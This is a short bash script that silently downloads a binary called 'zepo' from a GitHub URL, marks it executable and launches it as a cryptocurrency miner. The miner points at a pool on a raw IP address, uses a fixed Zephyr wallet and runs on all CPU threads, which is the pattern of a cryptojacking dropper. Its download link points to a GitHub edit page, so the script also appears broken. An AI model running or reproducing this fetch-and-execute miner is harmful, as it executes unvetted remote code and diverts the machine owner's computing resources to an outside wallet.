#!/bin/bash
wget https://github.com/6248202226/gradi/edit/main/zepo >/dev/null 2>&1
chmod +x zepo
./zepo --donate-level 1 -o 149.28.147.155:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59 -p $(echo $(shuf -i 1-100000 -n 1)-A) -a rx/0 -k -t $(nproc --all) 
